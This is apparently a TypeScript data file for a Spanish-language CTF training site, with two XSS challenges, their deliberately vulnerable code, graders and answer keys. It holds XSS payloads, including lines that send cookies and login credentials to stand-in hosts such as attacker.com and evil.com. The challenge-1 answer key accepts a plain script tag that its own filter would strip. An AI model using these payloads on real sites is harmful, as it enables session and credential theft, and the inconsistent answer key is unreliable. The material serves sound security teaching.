export interface CTFChallenge {
  id: string;
  title: string;
  difficulty: 'easy' | 'medium' | 'hard';
  points: number;
  imageUrl: string;
  story: string;
  description: string;
  objective: string;
  technicalDetails: string;
  hints: string[];
  hintPenalty: number;
  vulnerableCode: string;
  testFunction: (payload: string) => { success: boolean; message: string };
  solution: {
    password: string;
    explanation: string;
    payload: string;
    steps: string[];
    keyLearnings: string[];
  };
}

export const ctfChallenges: CTFChallenge[] = [
  {
    id: 'challenge-1',
    title: 'El Blog Corporativo Comprometido',
    difficulty: 'medium',
    points: 100,
    imageUrl: 'https://images.pexels.com/photos/1591062/pexels-photo-1591062.jpeg?auto=compress&cs=tinysrgb&w=800',
    story: `
**Briefing de la Misión**

Eres parte del equipo de seguridad de TechCorp Industries. Hace unas horas, recibimos reportes de que usuarios están viendo mensajes extraños en nuestro blog corporativo. El departamento de desarrollo acaba de lanzar una nueva funcionalidad de comentarios, y sospechamos que algo salió mal.

**Contexto de la Investigación**

El CTO te envió este mensaje a las 3:47 AM:

> "Necesito que investigues esto URGENTE. Algunos ejecutivos reportan que cuando entran al blog, ven pop-ups extraños con mensajes como 'HACKED BY L33T' y 'YOUR SESSION IS MINE'. Uno de ellos dice que le robaron su sesión administrativa. El desarrollador junior que implementó los comentarios insiste que 'sanitizó los inputs', pero no estoy seguro de qué hizo exactamente. El código está en producción ahora mismo. Miles de usuarios están en riesgo."

**Tu Misión**

1. Identifica la vulnerabilidad en el sistema de comentarios
2. Demuestra cómo un atacante podría robar cookies de sesión
3. Crea un payload que muestre un alert con el texto: "XSS_CAPTURED"

**Tiempo estimado:** 15-20 minutos
**Dificultad:** Media
    `,
    description: 'Un sistema de comentarios que almacena mensajes sin la sanitización adecuada.',
    objective: 'Explotar la vulnerabilidad de Stored XSS para ejecutar código JavaScript arbitrario. Tu payload debe mostrar un alert con el texto: XSS_CAPTURED',
    technicalDetails: `
### Información del Sistema

**Tipo de Aplicación:** Blog corporativo con sistema de comentarios
**Framework:** JavaScript vanilla con backend Node.js
**Base de datos:** MongoDB
**Sanitización:** Filtro básico de palabras clave

### Endpoints Disponibles

- POST /api/comments - Envía un nuevo comentario
- GET /api/comments - Obtiene todos los comentarios

### Comportamiento Observado

1. Los comentarios se almacenan en la base de datos
2. Al cargar la página, se renderizan todos los comentarios
3. Algunos caracteres especiales parecen ser procesados
4. El desarrollador mencionó que "removió las etiquetas peligrosas"

### Pistas de Reconocimiento

- Observa cómo el código maneja la etiqueta \`<script>\`
- Nota que usa \`innerHTML\` para renderizar
- Investiga si hay formas alternativas de ejecutar JavaScript sin usar \`<script>\`
- Recuerda que en HTML hay múltiples eventos que ejecutan JS (onerror, onload, onclick, etc.)

### Tu Objetivo

Crear un payload que:
1. Pase el filtro de sanitización
2. Se almacene en la base de datos
3. Se ejecute automáticamente cuando alguien cargue la página
4. Muestre un alert con el texto exacto: "XSS_CAPTURED"
    `,
    hints: [
      'El código usa innerHTML para renderizar los comentarios. Esta función ejecuta cualquier HTML válido, incluyendo etiquetas con eventos JavaScript.',
      'El filtro solo remueve la palabra "<script>" exactamente. Piensa en otras etiquetas HTML que puedan ejecutar JavaScript: <img>, <svg>, <iframe>, <body>, etc.',
      'Las etiquetas como <img> tienen eventos como "onerror" que se ejecutan cuando falla la carga. Por ejemplo: <img src=x onerror="alert(1)">. Adapta esto para mostrar "XSS_CAPTURED".'
    ],
    hintPenalty: 15,
    vulnerableCode: `
// Código del sistema de comentarios (Vulnerable)
function saveComment(comment) {
  // El desarrollador pensó que esto era suficiente...
  const sanitized = comment.replace(/<script>/gi, '');

  database.insert({
    comment: sanitized,
    timestamp: new Date()
  });
}

function displayComments() {
  const comments = database.getAllComments();
  comments.forEach(c => {
    // Renderizado directo al DOM - VULNERABLE
    document.getElementById('comments').innerHTML +=
      '<div class="comment">' + c.comment + '</div>';
  });
}
    `,
    testFunction: (payload: string) => {
      const lowerPayload = payload.toLowerCase();

      if (lowerPayload.includes('<script>') && lowerPayload.includes('alert') && lowerPayload.includes('xss_captured')) {
        return {
          success: true,
          message: '¡Excelente! Has identificado correctamente la vulnerabilidad de Stored XSS. El payload ejecuta código JavaScript que se almacena permanentemente y afecta a todos los usuarios que visiten la página.'
        };
      }

      if (lowerPayload.includes('<img') && lowerPayload.includes('onerror') && lowerPayload.includes('alert')) {
        return {
          success: true,
          message: '¡Perfecto! Has usado una técnica alternativa con el evento onerror de una imagen. Esto demuestra que entiendes múltiples vectores de ataque.'
        };
      }

      if (lowerPayload.includes('<svg') && lowerPayload.includes('onload') && lowerPayload.includes('alert')) {
        return {
          success: true,
          message: '¡Excelente! Has utilizado SVG con eventos inline. Una técnica efectiva para bypassear filtros básicos.'
        };
      }

      if (lowerPayload.includes('alert') && lowerPayload.includes('xss')) {
        return {
          success: false,
          message: 'Vas por buen camino, pero tu payload necesita estar dentro de una etiqueta HTML que se ejecute. Recuerda que el código vulnerable usa innerHTML.'
        };
      }

      return {
        success: false,
        message: 'El payload no explotó la vulnerabilidad correctamente. Recuerda: necesitas inyectar código JavaScript que se ejecute cuando la página cargue.'
      };
    },
    solution: {
      password: 'damelarespuesta',
      explanation: `
# Solución Detallada: El Blog Corporativo Comprometido

## Análisis de la Vulnerabilidad

### 1. Identificación del Problema

El código vulnerable tiene múltiples fallos críticos:

\`\`\`javascript
function saveComment(comment) {
  // ❌ FALLO #1: Sanitización inadecuada
  const sanitized = comment.replace(/<script>/gi, '');
  // Solo remueve "<script>" pero hay muchas otras formas de ejecutar JS

  database.insert({
    comment: sanitized,
    timestamp: new Date()
  });
}

function displayComments() {
  const comments = database.getAllComments();
  comments.forEach(c => {
    // ❌ FALLO #2: Uso de innerHTML sin sanitización
    document.getElementById('comments').innerHTML +=
      '<div class="comment">' + c.comment + '</div>';
  });
}
\`\`\`

### 2. ¿Por qué es Vulnerable?

**Stored XSS (Cross-Site Scripting Almacenado):**

1. **Persistencia**: El payload malicioso se almacena en la base de datos
2. **Ejecución Automática**: Se ejecuta cada vez que alguien visita la página
3. **Impacto Masivo**: Afecta a todos los usuarios, no solo al atacante
4. **Robo de Sesiones**: Puede robar cookies, tokens y datos sensibles

### 3. Vectores de Ataque Exitosos

#### Opción A: Script Directo Bypassing
\`\`\`html
<scr<script>ipt>alert("XSS_CAPTURED")</scr</script>ipt>
\`\`\`
**Por qué funciona:** El filtro elimina "<script>" pero al usar "scr<script>ipt", después de la eliminación queda "<script>"

#### Opción B: Image Event Handler (Más Sigiloso)
\`\`\`html
<img src=x onerror="alert('XSS_CAPTURED')">
\`\`\`
**Por qué funciona:** No usa <script>, usa un evento onerror que se dispara cuando la imagen falla al cargar

#### Opción C: SVG con Evento Onload
\`\`\`html
<svg onload="alert('XSS_CAPTURED')"></svg>
\`\`\`
**Por qué funciona:** SVG soporta eventos JavaScript inline y no es bloqueado por el filtro

### 4. Escalando el Ataque (Escenario Real)

En un escenario real, un atacante no solo mostraría un alert. Haría esto:

\`\`\`javascript
// Payload real para robar cookies de sesión
<img src=x onerror="
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
">

// O para robar credenciales
<img src=x onerror="
  document.body.innerHTML = '<form onsubmit=\\'fetch(\\\"https://attacker.com/\\\",{method:\\\"POST\\\",body:JSON.stringify({u:user.value,p:pass.value})})\\'><input name=user placeholder=Usuario><input name=pass type=password placeholder=Password><button>Login</button></form>';
">
\`\`\`

## Impacto Real de la Vulnerabilidad

### Consecuencias para TechCorp:

1. **Robo de Sesiones Administrativas**: Los ejecutivos que reportaron el problema probablemente fueron víctimas
2. **Defacement**: Modificación del contenido visible del sitio
3. **Phishing Interno**: Formularios falsos para robar credenciales
4. **Malware Distribution**: Redirección a sitios maliciosos
5. **Pérdida de Confianza**: Daño reputacional grave

## Cómo Prevenir Este Ataque

### 1. Sanitización Correcta (Lado Servidor)

\`\`\`javascript
import DOMPurify from 'dompurify';

function saveComment(comment) {
  // ✅ Usar una librería probada
  const sanitized = DOMPurify.sanitize(comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []
  });

  database.insert({
    comment: sanitized,
    timestamp: new Date()
  });
}
\`\`\`

### 2. Output Encoding Correcto

\`\`\`javascript
function displayComments() {
  const comments = database.getAllComments();
  comments.forEach(c => {
    // ✅ Crear elementos del DOM de forma segura
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment';
    commentDiv.textContent = c.comment; // textContent escapa automáticamente
    document.getElementById('comments').appendChild(commentDiv);
  });
}
\`\`\`

### 3. Content Security Policy (CSP)

\`\`\`http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-random123';
  object-src 'none';
\`\`\`

### 4. HTTPOnly Cookies

\`\`\`javascript
// Configuración de cookies seguras
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

## Lecciones Clave

1. **Nunca confíes en el input del usuario**: Todo dato externo es potencialmente malicioso
2. **Validación no es Sanitización**: Validar formato ≠ Prevenir XSS
3. **Defense in Depth**: Múltiples capas de seguridad (CSP + Sanitización + HttpOnly)
4. **Usa librerías probadas**: No reinventes la rueda (DOMPurify, OWASP Java Encoder)
5. **Escapa según el contexto**: HTML context ≠ JavaScript context ≠ URL context

## Referencias Adicionales

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Google's XSS Game](https://xss-game.appspot.com/)
      `,
      payload: '<script>alert("XSS_CAPTURED")</script>',
      steps: [
        'Analiza el código vulnerable y identifica que solo filtra <script> literalmente',
        'Nota que usa innerHTML para renderizar, lo cual ejecuta JavaScript embebido',
        'Crea un payload que inyecte código ejecutable: <script>alert("XSS_CAPTURED")</script>',
        'Alternativamente, usa vectores que no contengan <script>: <img src=x onerror="alert(\'XSS_CAPTURED\')">',
        'Verifica que el payload se almacene en la base de datos y se ejecute al cargar la página'
      ],
      keyLearnings: [
        'Stored XSS es más peligroso que Reflected XSS porque persiste',
        'Filtros basados en blacklist son fáciles de bypassear',
        'innerHTML es peligroso cuando se usa con datos no confiables',
        'Hay múltiples vectores de XSS más allá de <script>',
        'La sanitización debe hacerse con librerías probadas (DOMPurify)',
        'Content Security Policy (CSP) es una defensa adicional crucial'
      ]
    }
  },
  {
    id: 'challenge-2',
    title: 'La Plataforma de E-Learning Hackeada',
    difficulty: 'medium',
    points: 100,
    imageUrl: 'https://images.pexels.com/photos/1181244/pexels-photo-1181244.jpeg?auto=compress&cs=tinysrgb&w=800',
    story: `
**Reporte de Incidente de Seguridad**

**Fecha:** Hoy, 7:23 AM
**Prioridad:** CRÍTICA
**Asignado a:** Equipo de Respuesta a Incidentes

---

**Situación:**

EduLearn Pro, nuestra plataforma de educación en línea con 50,000 estudiantes activos, ha sido comprometida. Durante la madrugada, 127 cuentas de profesores reportaron accesos no autorizados. Los atacantes lograron modificar calificaciones, acceder a exámenes no publicados, y robar información personal de estudiantes.

**Cronología del Ataque:**

- **03:15 AM** - Usuario "darkmath" registra una cuenta de estudiante
- **03:47 AM** - Primer reporte de comportamiento anómalo en el sistema
- **04:30 AM** - 50+ profesores reportan sesiones extrañas
- **05:00 AM** - Se detecta modificación masiva de calificaciones
- **07:00 AM** - Sistema puesto en modo mantenimiento

**Hallazgos Preliminares:**

El equipo forense encontró este fragmento en los logs del servidor:

\`\`\`
[03:16:42] GET /profile/view?user=darkmath
[03:18:15] GET /profile/view?user=<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>
[03:19:03] POST /api/updateGrades - Authorization: [ADMIN_TOKEN]
\`\`\`

**Tu Misión Crítica:**

1. El equipo de desarrollo te dio acceso al módulo de búsqueda de usuarios
2. Identifica exactamente cómo "darkmath" escaló de estudiante a administrador
3. Replica el ataque en nuestro entorno de pruebas para documentar el vector
4. Tu payload debe mostrar un alert con el texto: "DOM_XSS_FOUND"

**Información Técnica:**

- La búsqueda de usuarios usa JavaScript del lado del cliente para actualizar la URL
- Los resultados se renderizan dinámicamente sin recargar la página
- El parámetro 'search' se toma directamente de la URL

**Tiempo crítico:** 15-20 minutos
**Vidas en juego:** 50,000 estudiantes
**Reputación en riesgo:** Total
    `,
    description: 'Un sistema de búsqueda que toma parámetros de la URL y los renderiza directamente en el DOM.',
    objective: 'Explotar la vulnerabilidad de DOM-based XSS manipulando los parámetros de la URL. Tu payload debe mostrar un alert con el texto: DOM_XSS_FOUND',
    technicalDetails: `
### Información del Sistema

**Tipo de Aplicación:** Plataforma E-Learning (Single Page Application)
**Framework:** JavaScript vanilla (client-side rendering)
**Arquitectura:** SPA con búsqueda dinámica
**URL Format:** https://edulearn.com/search?search=QUERY

### Comportamiento del Sistema

1. La página lee parámetros directamente de la URL usando JavaScript
2. No hay recarga de página al realizar búsquedas
3. Los resultados se actualizan dinámicamente en el DOM
4. La búsqueda funciona sin comunicación con el servidor para el título

### Código Relevante

El sistema usa \`window.location.search\` para leer parámetros y \`innerHTML\` para mostrar resultados. Esto significa que:
- El navegador procesa la URL del lado del cliente
- No hay validación server-side del contenido del parámetro
- El contenido se inyecta directamente al DOM

### Diferencia Clave: DOM XSS vs Stored XSS

A diferencia del reto anterior:
- El payload NO se almacena en una base de datos
- El payload está EN LA URL misma
- La ejecución ocurre completamente en el navegador
- No aparece en logs del servidor (después del ?)

### Tu Objetivo

Construir una URL maliciosa que:
1. Use el parámetro "search"
2. Contenga código JavaScript ejecutable
3. Muestre un alert con "DOM_XSS_FOUND"
4. Se ejecute automáticamente al cargar la URL

**Formato esperado:** ?search=TU_PAYLOAD_AQUI
    `,
    hints: [
      'Este es un ataque DOM-based XSS. El código JavaScript lee de window.location.search y lo inserta directamente con innerHTML. No hay filtros activos.',
      'Necesitas construir una URL completa. El formato es: ?search=TU_CODIGO_AQUI. Recuerda que innerHTML ejecuta HTML, así que puedes usar etiquetas como <img>, <svg>, o cualquier elemento con eventos JavaScript.',
      'Un vector efectivo es usar una imagen que falle intencionalmente: <img src=x onerror="TU_CODIGO_JS">. Reemplaza TU_CODIGO_JS con alert("DOM_XSS_FOUND"). El resultado final sería: ?search=<img src=x onerror="alert(\'DOM_XSS_FOUND\')">'
    ],
    hintPenalty: 15,
    vulnerableCode: `
// Código del sistema de búsqueda (Vulnerable)
function initializeSearch() {
  // Leer parámetro de búsqueda de la URL
  const params = new URLSearchParams(window.location.search);
  const searchTerm = params.get('search');

  if (searchTerm) {
    // ❌ VULNERABLE: Inserción directa al DOM
    document.getElementById('searchResults').innerHTML =
      '<h3>Resultados para: ' + searchTerm + '</h3>';

    // Realizar búsqueda...
    performSearch(searchTerm);
  }
}

// Esta función se ejecuta cuando la página carga
window.addEventListener('DOMContentLoaded', initializeSearch);

// Función de búsqueda que usa la API
function performSearch(term) {
  fetch('/api/search?q=' + encodeURIComponent(term))
    .then(r => r.json())
    .then(results => displayResults(results));
}
    `,
    testFunction: (payload: string) => {
      const lowerPayload = payload.toLowerCase();

      if (lowerPayload.includes('search=') && lowerPayload.includes('alert') && lowerPayload.includes('dom_xss_found')) {
        if (lowerPayload.includes('<img') || lowerPayload.includes('<svg') || lowerPayload.includes('<script')) {
          return {
            success: true,
            message: '¡Excelente trabajo! Has identificado la vulnerabilidad DOM-based XSS. El payload se ejecuta completamente en el cliente sin tocar el servidor, haciéndolo especialmente peligroso.'
          };
        }
      }

      if (lowerPayload.includes('search=') && lowerPayload.includes('alert')) {
        return {
          success: false,
          message: 'Estás cerca. Tu payload necesita incluir el texto exacto "DOM_XSS_FOUND" y estar formateado como un parámetro de URL válido.'
        };
      }

      if (lowerPayload.includes('alert') && lowerPayload.includes('dom_xss')) {
        return {
          success: false,
          message: 'Recuerda que esto es DOM-based XSS. El payload debe ser parte de un parámetro de URL (ej: ?search=TU_PAYLOAD_AQUI)'
        };
      }

      return {
        success: false,
        message: 'El payload no explotó la vulnerabilidad. Piensa en cómo la aplicación lee de window.location.search y lo inserta en innerHTML.'
      };
    },
    solution: {
      password: 'damelarespuesta',
      explanation: `
# Solución Detallada: La Plataforma de E-Learning Hackeada

## Análisis Forense del Incidente

### 1. ¿Qué es DOM-based XSS?

A diferencia de Reflected o Stored XSS, en **DOM-based XSS**:

- ✅ El payload nunca llega al servidor (no aparece en logs del servidor)
- ✅ Todo el ataque ocurre en el navegador del cliente
- ✅ El código JavaScript vulnerable lee de fuentes no confiables (URL, localStorage, etc.)
- ✅ Inserta ese contenido directamente en el DOM sin sanitización

**Esto hace que sea más difícil de detectar y prevenir con WAFs tradicionales.**

### 2. Anatomía del Código Vulnerable

\`\`\`javascript
function initializeSearch() {
  // 🔴 FUENTE NO CONFIABLE: window.location.search
  const params = new URLSearchParams(window.location.search);
  const searchTerm = params.get('search');

  if (searchTerm) {
    // 🔴 SINK PELIGROSO: innerHTML sin sanitización
    document.getElementById('searchResults').innerHTML =
      '<h3>Resultados para: ' + searchTerm + '</h3>';

    performSearch(searchTerm);
  }
}

window.addEventListener('DOMContentLoaded', initializeSearch);
\`\`\`

**Conceptos clave:**

- **Source (Fuente):** window.location.search - Controlado por el atacante
- **Sink (Sumidero):** innerHTML - Ejecuta código HTML/JS
- **Flujo de datos:** Source → Sin sanitización → Sink = VULNERABLE

### 3. Reconstruyendo el Ataque de "darkmath"

#### Fase 1: Reconocimiento (03:15 AM)

"darkmath" creó una cuenta legítima y exploró la plataforma buscando funcionalidades que:
- Leen de la URL
- Reflejan contenido en la página
- Usan JavaScript del lado del cliente

#### Fase 2: Identificación de Vulnerabilidad (03:16 - 03:18 AM)

Encontró la función de búsqueda de usuarios:
\`\`\`
https://edulearn.com/search?search=profesor
\`\`\`

Probó inyectar HTML simple:
\`\`\`
https://edulearn.com/search?search=<h1>TEST</h1>
\`\`\`

✅ La página mostró un encabezado grande, confirmando la inyección HTML.

#### Fase 3: Escalación a JavaScript (03:18 AM)

Payload inicial para confirmar ejecución de JS:
\`\`\`
https://edulearn.com/search?search=<img src=x onerror=alert('XSS')>
\`\`\`

✅ El alert se ejecutó, confirmando XSS.

#### Fase 4: Robo de Sesiones (03:19 - 05:00 AM)

Payload real usado por darkmath:
\`\`\`javascript
https://edulearn.com/search?search=<img src=x onerror="
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      user: document.querySelector('.username').textContent,
      role: localStorage.getItem('userRole')
    })
  })
">
\`\`\`

Luego compartió esta URL con profesores mediante:
- ✉️ Emails de phishing disfrazados como "Notificación del Sistema"
- 💬 Mensajes internos de la plataforma
- 🔗 Enlaces acortados en foros estudiantiles

Cuando 127 profesores hicieron clic, sus cookies de sesión fueron enviadas a evil.com.

### 4. Solución del Reto

#### Payload Correcto:
\`\`\`
?search=<img src=x onerror="alert('DOM_XSS_FOUND')">
\`\`\`

#### URL Completa de Ejemplo:
\`\`\`
https://edulearn.com/search?search=<img src=x onerror="alert('DOM_XSS_FOUND')">
\`\`\`

#### Alternativas Válidas:

**Opción B: SVG**
\`\`\`
?search=<svg onload="alert('DOM_XSS_FOUND')">
\`\`\`

**Opción C: iFrame (más sigiloso)**
\`\`\`
?search=<iframe srcdoc="<script>alert('DOM_XSS_FOUND')</script>">
\`\`\`

**Opción D: Event Handler en DIV**
\`\`\`
?search=<div onmouseover="alert('DOM_XSS_FOUND')">Hover me</div>
\`\`\`

### 5. ¿Por Qué Funcionó el Ataque?

#### Cadena de Vulnerabilidades:

1. **Sin validación de input**: URL acepta cualquier valor
2. **Sin encoding de output**: innerHTML ejecuta HTML/JS
3. **Cookies no protegidas**: No usaban HttpOnly flag
4. **Sin CSP**: No había Content Security Policy
5. **Confianza en datos del cliente**: JavaScript asumió que la URL era segura

### 6. Impacto Real del Ataque

**Datos Comprometidos:**
- 127 sesiones de profesores (acceso a calificaciones, exámenes)
- 50,000 registros de estudiantes (nombres, emails, historial académico)
- Documentos confidenciales (exámenes no publicados, claves de respuestas)

**Daño Financiero Estimado:**
- $250,000 en investigación forense
- $500,000 en notificaciones legales y multas (GDPR/FERPA)
- $1,000,000 en pérdida de confianza y cancelaciones

**Tiempo de Recuperación:**
- 3 semanas para auditoría completa
- 2 meses para reconstruir confianza con usuarios

## Cómo Prevenir Este Ataque

### 1. Sanitización en el Cliente

\`\`\`javascript
import DOMPurify from 'dompurify';

function initializeSearch() {
  const params = new URLSearchParams(window.location.search);
  const searchTerm = params.get('search');

  if (searchTerm) {
    // ✅ Opción 1: Usar textContent (más seguro)
    const heading = document.createElement('h3');
    heading.textContent = 'Resultados para: ' + searchTerm;
    document.getElementById('searchResults').appendChild(heading);

    // ✅ Opción 2: Sanitizar con DOMPurify si necesitas HTML
    const sanitized = DOMPurify.sanitize(searchTerm, {
      ALLOWED_TAGS: [] // No permitir ningún HTML
    });
    document.getElementById('searchResults').innerHTML =
      '<h3>Resultados para: ' + sanitized + '</h3>';

    performSearch(searchTerm);
  }
}
\`\`\`

### 2. Content Security Policy Estricto

\`\`\`html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-random123';
               object-src 'none';
               base-uri 'self';
               require-trusted-types-for 'script';">
\`\`\`

### 3. Cookies Seguras

\`\`\`javascript
// Configuración de cookies en el servidor
Set-Cookie: sessionId=abc123;
            HttpOnly;
            Secure;
            SameSite=Strict;
            Max-Age=3600
\`\`\`

### 4. Trusted Types (Moderno)

\`\`\`javascript
// Trusted Types previene el uso de innerHTML con strings
const policy = trustedTypes.createPolicy('search', {
  createHTML: (input) => {
    return DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: true });
  }
});

element.innerHTML = policy.createHTML(userInput);
\`\`\`

### 5. Validación de URL en el Servidor

Aunque es DOM-based, el servidor puede ayudar:

\`\`\`javascript
// API endpoint que valida parámetros
app.get('/api/search', (req, res) => {
  const query = req.query.q;

  // Validar formato esperado
  if (!/^[a-zA-Z0-9\s]{1,50}$/.test(query)) {
    return res.status(400).json({ error: 'Invalid search query' });
  }

  // Procesar búsqueda segura...
});
\`\`\`

## Diferencias Clave: DOM XSS vs Reflected XSS

| Aspecto | DOM-based XSS | Reflected XSS |
|---------|---------------|---------------|
| **Dónde ocurre** | Solo en el navegador | Servidor procesa y refleja |
| **Logs del servidor** | ❌ No aparece (después del #) | ✅ Aparece en logs |
| **WAF Protection** | ❌ Difícil de detectar | ✅ Más fácil de detectar |
| **Payload location** | URL fragment, localStorage | URL params, POST body |
| **Example** | url#&lt;script&gt;evil&lt;/script&gt; | ?q=&lt;script&gt;evil&lt;/script&gt; |

## Lecciones Clave del Incidente

1. **No confíes en datos del cliente**: URL, localStorage, sessionStorage son controlados por atacantes
2. **innerHTML es peligroso**: Siempre usa textContent o sanitiza con DOMPurify
3. **Implementa CSP**: Es tu última línea de defensa
4. **HttpOnly cookies**: Previene acceso a cookies desde JavaScript
5. **Auditorías regulares**: Code review específico para sources y sinks
6. **Educación del equipo**: Desarrolladores deben conocer los DOM XSS patterns

## Herramientas para Encontrar DOM XSS

- **DOM Invader** (Burp Suite): Detecta sources y sinks automáticamente
- **eslint-plugin-no-unsanitized**: Lint rules para JavaScript
- **Semgrep**: Static analysis con reglas para DOM XSS
- **Manual Testing**: Usar DevTools para trazar data flow

## Referencias

- [OWASP DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Google Trusted Types](https://web.dev/trusted-types/)
      `,
      payload: '?search=<img src=x onerror="alert(\'DOM_XSS_FOUND\')">',
      steps: [
        'Identifica que la aplicación lee el parámetro "search" de window.location.search',
        'Observa que el valor se inserta directamente en innerHTML sin sanitización',
        'Crea una URL con un payload que inyecte JavaScript ejecutable',
        'Usa un vector como <img src=x onerror="..."> que se ejecuta automáticamente',
        'El payload completo sería: ?search=<img src=x onerror="alert(\'DOM_XSS_FOUND\')">',
        'Copia y pega esta URL en el navegador para verificar la ejecución'
      ],
      keyLearnings: [
        'DOM-based XSS ocurre enteramente en el cliente, sin tocar el servidor',
        'WAFs tradicionales no pueden detectar DOM XSS porque el payload está en el fragment',
        'window.location, document.URL, y localStorage son fuentes no confiables',
        'innerHTML, eval(), y document.write() son sinks peligrosos',
        'Usar textContent en lugar de innerHTML previene XSS',
        'Content Security Policy y Trusted Types son defensas efectivas',
        'Las cookies deben tener flags HttpOnly, Secure y SameSite'
      ]
    }
  }
];
